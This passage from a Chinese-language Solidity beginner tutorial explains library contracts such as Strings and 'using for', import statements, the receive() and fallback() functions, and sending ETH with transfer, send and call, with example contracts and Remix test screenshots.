*/</span><br><span class="line">    function toHexString(uint256 value, uint256 length) public pure returns (string memory) &#123;</span><br><span class="line">        bytes memory buffer = new bytes(2 * length + 2);</span><br><span class="line">        buffer[0] = &quot;0&quot;;</span><br><span class="line">        buffer[1] = &quot;x&quot;;</span><br><span class="line">        for (uint256 i = 2 * length + 1; i &gt; 1; --i) &#123;</span><br><span class="line">            buffer[i] = _HEX_SYMBOLS[value &amp; 0xf];</span><br><span class="line">            value &gt;&gt;= 4;</span><br><span class="line">        &#125;</span><br><span class="line">        require(value == 0, &quot;Strings: hex length insufficient&quot;);</span><br><span class="line">        return string(buffer);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">// 用函数调用另一个库合约</span><br><span class="line">contract UseLibrary&#123;    </span><br><span class="line">    // 利用using for操作使用库</span><br><span class="line">    using Strings for uint256;</span><br><span class="line">    function getString1(uint256 _number) public pure returns(string memory)&#123;</span><br><span class="line">        // 库函数会自动添加为uint256型变量的成员</span><br><span class="line">        return _number.toHexString();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 直接通过库合约名调用</span><br><span class="line">    function getString2(uint256 _number) public pure returns(string memory)&#123;</span><br><span class="line">        return Strings.toHexString(_number);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="库合约-2">库合约</h3><p>库合约是一种特殊的合约，为了提升<code>Solidity</code>代码的复用性和减少<code>gas</code>而存在。库合约是一系列的函数合集，由大神或者项目方创作，咱们站在巨人的肩膀上，会用就行了。</p><p>他和普通合约主要有以下几点不同：</p><ol><li>不能存在状态变量</li><li>不能够继承或被继承</li><li>不能接收以太币</li><li>不可以被销毁</li></ol><p>需要注意的是，库合约中的函数可见性如果被设置为<code>public</code>或者<code>external</code>，则在调用函数时会触发一次<code>delegatecall</code>。而如果被设置为<code>internal</code>，则不会引起。对于设置为<code>private</code>可见性的函数来说，其仅能在库合约中可见，在其他合约中不可用。</p><h3 id="Strings库合约">Strings库合约</h3><p><code>Strings库合约</code>是将<code>uint256</code>类型转换为相应的<code>string</code>类型的代码库，样例代码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">library Strings &#123;</span><br><span class="line">    bytes16 private constant _HEX_SYMBOLS = &quot;0123456789abcdef&quot;;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @dev Converts a `uint256` to its ASCII `string` decimal representation.</span><br><span class="line">     */</span><br><span class="line">    function toString(uint256 value) public pure returns (string memory) &#123;</span><br><span class="line">        // Inspired by OraclizeAPI&#x27;s implementation - MIT licence</span><br><span class="line">        // https://github.com/oraclize/ethereum-api/blob/b42146b063c7d6ee1358846c198246239e9360e8/oraclizeAPI_0.4.25.sol</span><br><span class="line"></span><br><span class="line">        if (value == 0) &#123;</span><br><span class="line">            return &quot;0&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        uint256 temp = value;</span><br><span class="line">        uint256 digits;</span><br><span class="line">        while (temp != 0) &#123;</span><br><span class="line">            digits++;</span><br><span class="line">            temp /= 10;</span><br><span class="line">        &#125;</span><br><span class="line">        bytes memory buffer = new bytes(digits);</span><br><span class="line">        while (value != 0) &#123;</span><br><span class="line">            digits -= 1;</span><br><span class="line">            buffer[digits] = bytes1(uint8(48 + uint256(value % 10)));</span><br><span class="line">            value /= 10;</span><br><span class="line">        &#125;</span><br><span class="line">        return string(buffer);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @dev Converts a `uint256` to its ASCII `string` hexadecimal representation.</span><br><span class="line">     */</span><br><span class="line">    function toHexString(uint256 value) public pure returns (string memory) &#123;</span><br><span class="line">        if (value == 0) &#123;</span><br><span class="line">            return &quot;0x00&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        uint256 temp = value;</span><br><span class="line">        uint256 length = 0;</span><br><span class="line">        while (temp != 0) &#123;</span><br><span class="line">            length++;</span><br><span class="line">            temp &gt;&gt;= 8;</span><br><span class="line">        &#125;</span><br><span class="line">        return toHexString(value, length);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @dev Converts a `uint256` to its ASCII `string` hexadecimal representation with fixed length.</span><br><span class="line">     */</span><br><span class="line">    function toHexString(uint256 value, uint256 length) public pure returns (string memory) &#123;</span><br><span class="line">        bytes memory buffer = new bytes(2 * length + 2);</span><br><span class="line">        buffer[0] = &quot;0&quot;;</span><br><span class="line">        buffer[1] = &quot;x&quot;;</span><br><span class="line">        for (uint256 i = 2 * length + 1; i &gt; 1; --i) &#123;</span><br><span class="line">            buffer[i] = _HEX_SYMBOLS[value &amp; 0xf];</span><br><span class="line">            value &gt;&gt;= 4;</span><br><span class="line">        &#125;</span><br><span class="line">        require(value == 0, &quot;Strings: hex length insufficient&quot;);</span><br><span class="line">        return string(buffer);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>它主要包含两个函数，<code>toString()</code>将<code>uint256</code>转换为10进制的<code>string</code>，<code>toHexString()</code>将<code>uint256</code>转换为16进制的<code>string</code>。</p><h3 id="如何使用库合约？">如何使用库合约？</h3><p>我们用<code>Strings</code>库合约的<code>toHexString()</code>来演示两种使用库合约中函数的办法。</p><ul><li>利用using for指令，指令<code>using A for B;</code>可用于附加库合约（从库<code> A</code>）到任何类型（<code>B</code>）。添加完指令后，库<code>A</code>中的函数会自动添加为<code>B</code>类型变量的成员，可以直接调用。注意：在调用的时候，这个变量会被当作第一个参数传递给函数：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">// 利用using for指令</span><br><span class="line">using Strings for uint256;</span><br><span class="line">function getString1(uint256 _number) public pure returns(string memory)&#123;</span><br><span class="line">    // 库合约中的函数会自动添加为uint256型变量的成员</span><br><span class="line">    return _number.toHexString();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>通过库合约名称调用函数</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// 直接通过库合约名调用</span><br><span class="line">function getString2(uint256 _number) public pure returns(string memory)&#123;</span><br><span class="line">    return Strings.toHexString(_number);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们部署合约并输入<code>130</code>测试一下，两种方法均能返回正确的16进制string <code>0x82</code>。证明我们调用库合约成功！</p><p><img src="/2025/02/03/Solidity%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0-%E4%B8%89/image-20250204035623180.png" alt="image-20250204035623180"></p><p>常见的库合约有：</p><ol><li><a href="https://github.com/OpenZeppelin/openzeppelin-contracts/blob/4a9cc8b4918ef3736229a5cc5a310bdc17bf759f/contracts/utils/Strings.sol">Strings</a>：将<code>uint256</code>转换为<code>String</code></li><li><a href="https://github.com/OpenZeppelin/openzeppelin-contracts/blob/4a9cc8b4918ef3736229a5cc5a310bdc17bf759f/contracts/utils/Address.sol">Address</a>：判断某个地址是否为合约地址</li><li><a href="https://github.com/OpenZeppelin/openzeppelin-contracts/blob/4a9cc8b4918ef3736229a5cc5a310bdc17bf759f/contracts/utils/Create2.sol">Create2</a>：更安全的使用<code>Create2 EVM opcode</code></li><li><a href="https://github.com/OpenZeppelin/openzeppelin-contracts/blob/4a9cc8b4918ef3736229a5cc5a310bdc17bf759f/contracts/utils/Arrays.sol">Arrays</a>：跟数组相关的库合约</li></ol><h2 id="Import">Import</h2><p>在Solidity中，<code>import</code>语句可以帮助我们在一个文件中引用另一个文件的内容，提高代码的可重用性和组织性。本教程将向你介绍如何在Solidity中使用<code>import</code>语句。</p><h3 id="Import用法"><code>Import</code>用法</h3><ul><li>通过源文件相对位置导入，例子：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">文件结构</span><br><span class="line">├── Import.sol</span><br><span class="line">└── Yeye.sol</span><br><span class="line"></span><br><span class="line">// 通过文件相对位置import</span><br><span class="line">import &#x27;./Yeye.sol&#x27;;</span><br></pre></td></tr></table></figure><ul><li>通过源文件网址导入网上的合约的全局符号，例子：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// 通过网址引用</span><br><span class="line">import &#x27;https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/Address.sol&#x27;;</span><br></pre></td></tr></table></figure><ul><li>通过<code>npm</code>的目录导入，例子：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">import &#x27;@openzeppelin/contracts/access/Ownable.sol&#x27;;</span><br></pre></td></tr></table></figure><ul><li>通过指定<code>全局符号</code>导入合约特定的全局符号，例子：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">import &#123;Yeye&#125; from &#x27;./Yeye.sol&#x27;;</span><br></pre></td></tr></table></figure><ul><li>引用(<code>import</code>)在代码中的位置为：在声明版本号之后，在其余代码之前。</li></ul><h3 id="测试导入结果">测试导入结果</h3><p>我们可以用下面这段代码测试是否成功导入了外部源代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.21;</span><br><span class="line"></span><br><span class="line">// 通过文件相对位置import</span><br><span class="line">import &#x27;./Yeye.sol&#x27;;</span><br><span class="line">// 通过`全局符号`导入特定的合约</span><br><span class="line">import &#123;Yeye&#125; from &#x27;./Yeye.sol&#x27;;</span><br><span class="line">// 通过网址引用</span><br><span class="line">import &#x27;https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/Address.sol&#x27;;</span><br><span class="line">// 引用OpenZeppelin合约</span><br><span class="line">import &#x27;@openzeppelin/contracts/access/Ownable.sol&#x27;;</span><br><span class="line"></span><br><span class="line">contract Import &#123;</span><br><span class="line">    // 成功导入Address库</span><br><span class="line">    using Address for address;</span><br><span class="line">    // 声明yeye变量</span><br><span class="line">    Yeye yeye = new Yeye();</span><br><span class="line"></span><br><span class="line">    // 测试是否能调用yeye的函数</span><br><span class="line">    function test() external&#123;</span><br><span class="line">        yeye.hip();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>Yeye.sol</code>代码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.21;</span><br><span class="line"></span><br><span class="line">// 第10讲合约继承中的Yeye合约</span><br><span class="line">contract Yeye &#123;</span><br><span class="line">    event Log(string msg);</span><br><span class="line"></span><br><span class="line">    // 定义3个function: hip(), pop(), yeye()，Log值为Yeye。</span><br><span class="line">    function hip() public virtual&#123;</span><br><span class="line">        emit Log(&quot;Yeye hip&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function pop() public virtual&#123;</span><br><span class="line">        emit Log(&quot;Yeye pop&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function yeye() public virtual &#123;</span><br><span class="line">        emit Log(&quot;Yeye&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>测试结果如下：</p><p><img src="/2025/02/03/Solidity%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0-%E4%B8%89/image-20250204041504259.png" alt="image-20250204041504259"></p><h2 id="接收和发送ETH">接收和发送ETH</h2><p>本讲主要介绍ETH的接收和发送。</p><h3 id="接收ETH">接收ETH</h3><p><code>Solidity</code>支持两种特殊的回调函数，<code>receive()</code>和<code>fallback()</code>，他们主要在两种情况下被使用：</p><ul><li>接收ETH</li><li>处理合约中不存在的函数调用（代理合约proxy contract）</li></ul><p><strong>注意⚠️</strong>：在Solidity 0.6.x版本之前，语法上只有 <code>fallback()</code> 函数，用来接收用户发送的ETH时调用以及在被调用函数签名没有匹配到时，来调用。 0.6版本之后，Solidit才将 <code>fallback()</code> 函数拆分成 <code>receive()</code> 和 <code>fallback()</code> 两个函数。</p><h4 id="接收ETH函数receive">接收ETH函数<code>receive</code></h4><p><code>receive()</code>函数是在合约收到<code>ETH</code>转账时被调用的函数。</p><p>一个合约最多有一个<code>receive()</code>函数，声明方式与一般函数不一样，不需要<code>function</code>关键字：<code>receive() external payable &#123; ... &#125;</code>。<code>receive()</code>函数不能有任何的参数，不能返回任何值，<strong>必须包含<code>external</code>和<code>payable</code>。</strong></p><p>当合约接收ETH的时候，<code>receive()</code>会被触发。<code>receive()</code>最好不要执行太多的逻辑因为如果别人用<code>send</code>和<code>transfer</code>方法发送<code>ETH</code>的话，<code>gas</code>会限制在<code>2300</code>，<code>receive()</code>太复杂可能会触发<code>Out of Gas</code>报错；如果用<code>call</code>就可以自定义<code>gas</code>执行更复杂的逻辑（这三种发送ETH的方法我们之后会讲到）。</p><p>我们可以在<code>receive()</code>里发送一个<code>event</code>，例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">// 定义事件</span><br><span class="line">event Received(address Sender, uint Value);</span><br><span class="line">// 接收ETH时释放Received事件</span><br><span class="line">receive() external payable &#123;</span><br><span class="line">    emit Received(msg.sender, msg.value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>有些恶意合约，会在<code>receive()</code> 函数（老版本的话，就是 <code>fallback()</code> 函数）嵌入恶意消耗<code>gas</code>的内容或者使得执行故意失败的代码，导致一些包含退款和转账逻辑的合约不能正常工作，因此写包含退款等逻辑的合约时候，一定要注意这种情况。</p><h4 id="回退ETH函数fallback">回退ETH函数<code>fallback</code></h4><p><code>fallback()</code>函数会在调用合约不存在的函数时被触发。可用于接收ETH，也可以用于代理合约<code>proxy contract</code>。</p><p><code>fallback()</code>声明时不需要<code>function</code>关键字，<strong>必须由<code>external</code>修饰，一般也会用<code>payable</code>修饰</strong>，用于接收ETH:<code>fallback() external payable &#123; ... &#125;</code>。</p><p>我们定义一个<code>fallback()</code>函数，被触发时候会释放<code>fallbackCalled</code>事件，并输出<code>msg.sender</code>，<code>msg.value</code>和<code>msg.data</code>:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">event fallbackCalled(address Sender, uint Value, bytes Data);</span><br><span class="line"></span><br><span class="line">// fallback</span><br><span class="line">fallback() external payable&#123;</span><br><span class="line">    emit fallbackCalled(msg.sender, msg.value, msg.data);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="receive和fallback的区别"><code>receive</code>和<code>fallback</code>的区别</h4><p><code>receive</code>和<code>fallback</code>都能够用于接收<code>ETH</code>，他们触发的规则如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">触发fallback() 还是 receive()?</span><br><span class="line">           接收ETH</span><br><span class="line">              |</span><br><span class="line">         msg.data是空？</span><br><span class="line">            /  \</span><br><span class="line">          是    否</span><br><span class="line">          /      \</span><br><span class="line">receive()存在?   fallback()</span><br><span class="line">        / \</span><br><span class="line">       是  否</span><br><span class="line">      /     \</span><br><span class="line">receive()   fallback()</span><br></pre></td></tr></table></figure><p>简单来说，合约接收<code>ETH</code>时，<code>msg.data</code>为空且存在<code>receive()</code>时，会触发<code>receive()</code>；<code>msg.data</code>不为空或不存在<code>receive()</code>时，会触发<code>fallback()</code>，此时<code>fallback()</code>必须为<code>payable</code>。</p><p><code>receive()</code>和<code>payable fallback()</code>均不存在的时候，向合约<strong>直接</strong>发送<code>ETH</code>将会报错（你仍可以通过带有<code>payable</code>的函数向合约发送<code>ETH</code>）。</p><h4 id="测试代码演示">测试代码演示</h4><p>完整的测试代码<code>Fallback.sol</code>，如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.21;</span><br><span class="line"></span><br><span class="line">contract Fallback &#123;</span><br><span class="line">    /* 触发fallback() 还是 receive()?</span><br><span class="line">           接收ETH</span><br><span class="line">              |</span><br><span class="line">         msg.data是空？</span><br><span class="line">            /  \</span><br><span class="line">          是    否</span><br><span class="line">          /      \</span><br><span class="line">receive()存在?   fallback()</span><br><span class="line">        / \</span><br><span class="line">       是  否</span><br><span class="line">      /     \</span><br><span class="line">receive()  fallback   </span><br><span class="line">    */</span><br><span class="line"></span><br><span class="line">    // 定义事件</span><br><span class="line">    event receivedCalled(address Sender, uint Value);</span><br><span class="line">    event fallbackCalled(address Sender, uint Value, bytes Data);</span><br><span class="line"></span><br><span class="line">    // 接收ETH时释放Received事件</span><br><span class="line">    receive() external payable &#123;</span><br><span class="line">        emit receivedCalled(msg.sender, msg.value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // fallback</span><br><span class="line">    fallback() external payable&#123;</span><br><span class="line">        emit fallbackCalled(msg.sender, msg.value, msg.data);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>部署并执行代码，<code>VALUE</code>栏中输入要发送到合约中的金额，<code>CALLDATA</code>留空，点击<code>Transact</code>，成功触发到<code>receivedCalled</code>事件。</p><p><img src="/2025/02/03/Solidity%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0-%E4%B8%89/image-20250204160942747.png" alt="image-20250204160942747"></p><p>同样，<code>VALUE</code>栏中输入要发送到合约中的金额，<code>CALLDATA</code>输入任意编写的<code>0xabcd</code>，点击<code>Transact</code>，成功触发到<code>fallbackCalled</code>事件。</p><p><img src="/2025/02/03/Solidity%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0-%E4%B8%89/image-20250204161621064.png" alt="image-20250204161621064"></p><h3 id="发送ETH">发送ETH</h3><p><code>Solidity</code>有三种方法向其他合约发送<code>ETH</code>，他们是：<code>transfer()</code>，<code>send()</code>和<code>call()</code>，其中<code>call()</code>是被鼓励的用法。</p><p>完整的测试代码<code>SendETH.sol</code>如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.21;</span><br><span class="line"></span><br><span class="line">// 3种方法发送ETH</span><br><span class="line">// transfer: 2300 gas, revert</span><br><span class="line">// send: 2300 gas, return bool</span><br><span class="line">// call: all gas, return (bool, data)</span><br><span class="line"></span><br><span class="line">error SendFailed(); // 用send发送ETH失败error</span><br><span class="line">error CallFailed(); // 用call发送ETH失败error</span><br><span class="line"></span><br><span class="line">contract SendETH &#123;</span><br><span class="line">    // 构造函数，payable使得部署的时候可以转eth进去</span><br><span class="line">    constructor() payable&#123;&#125;</span><br><span class="line">    // receive方法，接收eth时被触发</span><br><span class="line">    receive() external payable&#123;&#125;</span><br><span class="line"></span><br><span class="line">    // 用transfer()发送ETH</span><br><span class="line">    function transferETH(address payable _to, uint256 amount) external payable&#123;</span><br><span class="line">        _to.transfer(amount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // send()发送ETH</span><br><span class="line">    function sendETH(address payable _to, uint256 amount) external payable&#123;</span><br><span class="line">        // 处理下send的返回值，如果失败，revert交易并发送error</span><br><span class="line">        bool success = _to.send(amount);</span><br><span class="line">        if(!success)&#123;</span><br><span class="line">            revert SendFailed();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // call()发送ETH</span><br><span class="line">    function callETH(address payable _to, uint256 amount) external payable&#123;</span><br><span class="line">        // 处理下call的返回值，如果失败，revert交易并发送error</span><br><span class="line">        (bool success,) = _to.call&#123;value: amount&#125;(&quot;&quot;);</span><br><span class="line">        if(!success)&#123;</span><br><span class="line">            revert CallFailed();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract ReceiveETH &#123;</span><br><span class="line">    // 收到eth事件，记录amount和gas</span><br><span class="line">    event Log(uint amount, uint gas);</span><br><span class="line"></span><br><span class="line">    // receive方法，接收eth时被触发</span><br><span class="line">    receive() external payable&#123;</span><br><span class="line">        emit Log(msg.value, gasleft());</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    // 返回合约ETH余额</span><br><span class="line">    function getBalance() view public returns(uint) &#123;</span><br><span class="line">        return address(this).balance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="接收ETH合约">接收ETH合约</h4><p>我们先部署一个接收<code>ETH</code>合约<code>ReceiveETH</code>。<code>ReceiveETH</code>合约里有一个事件<code>Log</code>，记录收到的<code>ETH</code>数量和<code>gas</code>剩余。还有两个函数，一个是<code>receive()</code>函数，收到<code>ETH</code>被触发，并发送<code>Log</code>事件；另一个是查询合约<code>ETH</code>余额的<code>getBalance()</code>函数。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">contract ReceiveETH &#123;</span><br><span class="line">    // 收到eth事件，记录amount和gas</span><br><span class="line">    event Log(uint amount, uint gas);</span><br><span class="line">    </span><br><span class="line">    // receive方法，接收eth时被触发</span><br><span class="line">    receive() external payable&#123;</span><br><span class="line">        emit Log(msg.value, gasleft());</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    // 返回合约ETH余额</span><br><span class="line">    function getBalance() view public returns(uint) &#123;</span><br><span class="line">        return address(this).balance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>部署<code>ReceiveETH</code>合约后，运行<code>getBalance()</code>函数，可以看到当前合约的<code>ETH</code>余额为<code>0</code>。</p><p><img src="/2025/02/03/Solidity%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0-%E4%B8%89/image-20250204164248838.png" alt="image-20250204164248838"></p><h4 id="发送ETH合约">发送ETH合约</h4><p>我们将实现三种方法向<code>ReceiveETH</code>合约发送<code>ETH</code>。首先，先在发送ETH合约<code>SendETH</code>中实现<code>payable</code>的<code>构造函数</code>和<code>receive()</code>，让我们能够在部署时和部署后向合约转账。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">contract SendETH &#123;</span><br><span class="line">    // 构造函数，payable使得部署的时候可以转eth进去</span><br><span class="line">    constructor() payable&#123;&#125;</span><br><span class="line">    // receive方法，接收eth时被触发</span><br><span class="line">    receive() external payable&#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="Transfer用法-次优">Transfer用法(次优)</h4><ul><li><p>用法是<code>接收方地址.transfer(发送ETH数额)</code>。</p></li><li><p><code>transfer()</code>的<code>gas</code>限制是<code>2300</code>，足够用于转账，但对方合约的<code>fallback()</code>或<code>receive()</code>函数不能实现太复杂的逻辑。</p></li><li><p><code>transfer()</code>如果转账失败，会自动<code>revert</code>（回滚交易）。</p></li></ul><p>代码样例，注意里面的<code>_to</code>填<code>ReceiveETH</code><strong>合约的地址</strong>，<code>amount</code>是<code>ETH</code>转账金额：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// 用transfer()发送ETH</span><br><span class="line">function transferETH(address payable _to, uint256 amount) external payable&#123;</span><br><span class="line">    _to.transfer(amount);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>部署<code>SendETH</code>合约后，对<code>ReceiveETH</code>合约发送ETH。</p><p><img src="/2025/02/03/Solidity%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0-%E4%B8%89/image-20250204172302122.png" alt="image-20250204172302122"></p><p><code>ReceiveETH</code>合约成功接收到转账的ETH。</p><p><img src="/2025/02/03/Solidity%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0-%E4%B8%89/image-20250204172327987.png" 